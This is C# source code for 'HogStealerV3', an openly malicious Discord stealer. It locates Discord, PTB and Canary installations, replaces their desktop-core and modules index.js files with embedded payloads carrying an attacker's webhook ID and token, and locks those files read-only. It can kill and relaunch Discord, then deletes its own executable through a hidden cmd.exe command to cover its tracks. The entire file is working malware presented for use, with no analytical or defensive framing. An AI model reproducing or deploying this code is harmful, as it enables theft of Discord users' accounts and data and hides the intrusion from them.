using HogStealerV3.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace HogStealerV3
{
    class Program
    {
        public enum Versions
        {
            discord,
            discordptb,
            discordcanary
        }
        static void Main(string[] args)
        {

            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\"+Versions.discord.ToString()))
            {
                Install(Versions.discord.ToString());
            }
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Versions.discordptb.ToString()))
            {
                Install(Versions.discordptb.ToString());
            }
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Versions.discordcanary.ToString()))
            {
                Install(Versions.discordcanary.ToString());
            }
            else
            {
                Bye();
            }
        }
        public static void Install(string version)
        {
                foreach (var index in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\"+version, "index.js", SearchOption.AllDirectories))
                {
                    if (index.Contains("discord_desktop_core"))
                    {
                        string indexpath = Path.GetFullPath(index);
                        Mod(indexpath);
                    }
                }
        }
        public static void Mod(string path)
        {
            try
            {
                string hkurl = Settings.Hook;
                string hookid = "a";
                string hooktoken = "a";
                if (hkurl.Contains("https://discord.com/api/webhooks/"))
                {
                    hookid = hkurl.Substring(33, 18);
                    hooktoken = hkurl.Substring(52, 68);
                }
                else if (hkurl.Contains("https://discordapp.com/api/webhooks/"))
                {
                    hookid = hkurl.Substring(36, 18);
                    hooktoken = hkurl.Substring(55, 68);
                }
                FileInfo fi = new FileInfo(path);
                bool RO = fi.IsReadOnly;
                if (RO)
                {
                    FileInfo js = new FileInfo(path)
                    {
                        IsReadOnly = false
                    };
                }
                string write1 = Resources.indexcore.Replace("%SVID%", hookid);
                string writeindexcore = write1.Replace("%HKTOKEN%", hooktoken);
                if (Settings.Restart)
                {
                    ByeDC();
                }
                File.WriteAllText(path, writeindexcore);
                File.SetAttributes(path, FileAttributes.ReadOnly);
                string path2 = path.Replace("discord_desktop_core", "discord_modules");
                FileInfo fi2 = new FileInfo(path2);
                bool RO2 = fi2.IsReadOnly;
                if (RO2)
                {
                    FileInfo js2 = new FileInfo(path2)
                    {
                        IsReadOnly = false
                    };
                }
                File.WriteAllText(path2, Resources.indexmodules);
                File.SetAttributes(path2, FileAttributes.ReadOnly);
                if (Settings.Restart)
                {
                    HiDC();
                }
                Thread.Sleep(1000);
                Bye();
            }
            catch
            {
                Bye();
            }
        }
        public static void ByeDC()
        {
            try
            {
                foreach (var discord in Process.GetProcessesByName("Discord"))
                {
                    discord.Kill();
                }
            }
            catch { }
        }
        public static void HiDC()
        {
            try
            {
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk");
                // Discord only runs from the shortcut idk why.
            }
            catch { }
        }
        public static void Bye()
        {
            ProcessStartInfo Melt = null;
            try
            {
                Melt = new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                };
            }
            catch { }
            finally
            {
                Process.Start(Melt);
                Environment.Exit(0);
            }
        }
    } 
}
